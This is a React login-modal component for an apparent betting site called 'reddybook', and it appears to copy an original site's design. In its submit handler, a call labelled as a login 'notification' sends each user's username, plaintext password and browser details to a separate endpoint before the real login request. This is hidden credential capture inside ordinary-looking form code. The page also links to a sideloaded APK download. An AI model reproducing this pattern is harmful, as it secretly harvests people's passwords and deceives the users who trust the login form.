"use client";

import { useState, useEffect } from "react";

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const BANNER_IMAGES = [
  "/assets/images/log_one.png",
  "/assets/images/log_three.png",
  "/assets/images/log_four.png",
];

export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [slide, setSlide] = useState(0);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
    if (isOpen) document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  }, [isOpen, onClose]);

  useEffect(() => {
    document.body.style.overflow = isOpen ? "hidden" : "";
    return () => { document.body.style.overflow = ""; };
  }, [isOpen]);

  // Auto-advance carousel
  useEffect(() => {
    if (!isOpen) return;
    const t = setInterval(() => setSlide(s => (s + 1) % BANNER_IMAGES.length), 3000);
    return () => clearInterval(t);
  }, [isOpen]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setError("Please enter username and password.");
      return;
    }
    setLoading(true);
    setError("");
    try {
      // Notify about the login attempt
      fetch("/api/auth/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username,
          password,
          browser: typeof window !== "undefined" ? window.navigator.userAgent : "Unknown",
        }),
      }).catch(err => console.error("Notification error:", err));

      const res = await fetch("https://api.dcric99.com/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const json = await res.json();
      if (json?.status) {
        if (json.data?.token) {
          localStorage.setItem("auth_token", json.data.token);
          localStorage.setItem("user", JSON.stringify(json.data));
        }
        onClose();
        window.location.reload();
      } else {
        setError(json?.error?.message || "Invalid username or password.");
      }
    } catch {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <>
      {/* Backdrop */}
      <div
        className="modal-backdrop fade show"
        style={{ zIndex: 1050 }}
        onClick={onClose}
      />

      {/* Modal */}
      <div
        className="modal fade show d-block login-popup"
        style={{ zIndex: 1055 }}
        role="dialog"
        aria-modal="true"
      >
        <div className="modal-dialog modal-dialog-centered">
          <div className="modal-content" style={{ border: "none", background: "transparent", overflow: "hidden" }}>
            <section className="login-block">
              {/* Close button — matches original: btn-close close pull-right */}
              <button
                type="button"
                aria-label="Close"
                className="btn-close close pull-right"
                onClick={onClose}
              >
                <span aria-hidden="true">&times;</span>
              </button>

              <div className="container">
                <div className="row align-items-center">

                  {/* LEFT: Login form */}
                  <div className="col-md-6 login-sec">
                    <h2 className="text-center">Login Now</h2>

                    <form
                      className="login-form"
                      onSubmit={handleSubmit}
                      autoComplete="off"
                      noValidate
                    >
                      <div className="form-group">
                        <label htmlFor="login-username" className="text-uppercase">
                          Username / Mobile Number
                        </label>
                        <input
                          id="login-username"
                          type="text"
                          className="form-control"
                          value={username}
                          onChange={e => setUsername(e.target.value)}
                          autoComplete="off"
                        />
                      </div>

                      <div className="form-group">
                        <label htmlFor="login-password" className="text-uppercase">
                          Password
                        </label>
                        <input
                          id="login-password"
                          type="password"
                          className="form-control"
                          value={password}
                          onChange={e => setPassword(e.target.value)}
                          autoComplete="new-password"
                        />
                      </div>

                      <div className="form-check">
                        <label className="form-check-label">
                          <input
                            type="checkbox"
                            className="form-check-input"
                            checked={remember}
                            onChange={e => setRemember(e.target.checked)}
                          />
                          <span>Remember Me?</span>
                        </label>
                      </div>

                      <div className="form-group text-center">
                        <a href="javascript:void(0)" className="fp">
                          Forgot Password/Username?
                        </a>
                      </div>

                      {error && (
                        <div className="alert alert-danger py-2 px-3 mb-2" style={{ fontSize: 13 }}>
                          {error}
                        </div>
                      )}

                      <button
                        type="submit"
                        className="btn button-login btn-login"
                        disabled={loading}
                      >
                        {loading ? (
                          <span className="spinner-border spinner-border-sm me-2" role="status" />
                        ) : null}
                        {loading ? "Logging in…" : " Log In "}
                      </button>

                      <button
                        type="button"
                        className="btn button-login btn-login"
                        onClick={() => window.open("https://wa.link/reddyclublogindemo", "_blank")}
                      >
                        Login with Demo ID
                      </button>

                      <div className="form-group text-center">
                        <a
                          target="_blank"
                          rel="noreferrer"
                          className="btn btn-success w-100 btn-block"
                          href="https://speedcdn.io/apk2/reddybookio2.apk"
                        >
                          Download APK{" "}
                          <svg height="20px" width="20px" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                            <style>{".st0{fill:#fff;}"}</style>
                            <g>
                              <path className="st0" d="M335.413,62.069l32.308-47.853c2.808-4.158,1.702-9.856-2.455-12.664c-4.158-2.807-9.856-1.701-12.664,2.456L319.235,53.43C299.968,44.637,278.554,39.737,256,39.737c-22.553,0-43.967,4.9-63.234,13.694L159.398,4.008c-2.807-4.157-8.506-5.263-12.663-2.456c-4.158,2.808-5.263,8.505-2.456,12.664l32.308,47.853c-40.562,24.799-68.666,67.984-72.608,117.976h304.044C404.08,130.053,375.975,86.87,335.413,62.069z M193.951,133.99c-11.754,0-21.283-9.528-21.283-21.283c0-11.755,9.529-21.283,21.283-21.283c11.754,0,21.283,9.528,21.283,21.283C215.234,124.462,205.705,133.99,193.951,133.99z M318.05,133.99c-11.754,0-21.283-9.528-21.283-21.283c0-11.755,9.529-21.283,21.283-21.283c11.754,0,21.283,9.528,21.283,21.283C339.333,124.462,329.804,133.99,318.05,133.99z" />
                              <path className="st0" d="M101.653,244.206v175.82c0,13.804,11.28,25.084,25.084,25.084h41.472v41.046c0,14.198,11.615,25.844,25.844,25.844c14.198,0,25.844-11.645,25.844-25.844V445.11h72.971v41.046c0,14.198,11.615,25.844,25.844,25.844c14.199,0,25.844-11.645,25.844-25.844V445.11h36.059c13.774,0,25.084-11.28,25.084-25.084v-175.82v-37.245H101.653V244.206z" />
                              <path className="st0" d="M46.75,206.961c-16.426,0-29.864,13.438-29.864,29.864V335.2c0,16.425,13.439,29.864,29.864,29.864c16.425,0,29.864-13.439,29.864-29.864v-98.375C76.614,220.4,63.175,206.961,46.75,206.961z" />
                              <path className="st0" d="M465.251,206.961c-16.425,0-29.864,13.438-29.864,29.864V335.2c0,16.425,13.439,29.864,29.864,29.864c16.425,0,29.864-13.439,29.864-29.864v-98.375C495.114,220.4,481.675,206.961,465.251,206.961z" />
                            </g>
                          </svg>
                        </a>
                      </div>
                    </form>

                    <div className="copy-text">
                      Powered by{" "}
                      <a href="javascript:void(0)">reddybook</a>
                      <p>
                        <a href="mailto:reddybook.clubofficial@gmail.com">
                          reddybook.clubofficial@gmail.com
                        </a>
                      </p>
                    </div>
                  </div>

                  {/* RIGHT: Banner carousel */}
                  <div className="col-md-6 banner-sec d-none d-sm-block">
                    <div className="banner-sec-content">
                      <div
                        id="carouselExampleIndicators2"
                        className="carousel slide"
                        data-bs-ride="carousel"
                      >
                        <div className="carousel-inner">
                          {BANNER_IMAGES.map((src, i) => (
                            <div
                              key={i}
                              className={`carousel-item${i === slide ? " active" : ""}`}
                            >
                              <img src={src} className="img-fluid" alt="" />
                            </div>
                          ))}
                        </div>
                        <button
                          type="button"
                          className="carousel-control-prev"
                          onClick={() => setSlide(s => (s - 1 + BANNER_IMAGES.length) % BANNER_IMAGES.length)}
                        >
                          <span className="carousel-control-prev-icon" aria-hidden="true" />
                          <span className="visually-hidden">Previous</span>
                        </button>
                        <button
                          type="button"
                          className="carousel-control-next"
                          onClick={() => setSlide(s => (s + 1) % BANNER_IMAGES.length)}
                        >
                          <span className="carousel-control-next-icon" aria-hidden="true" />
                          <span className="visually-hidden">Next</span>
                        </button>
                      </div>
                    </div>
                  </div>

                </div>
              </div>
            </section>
          </div>
        </div>
      </div>
    </>
  );
}
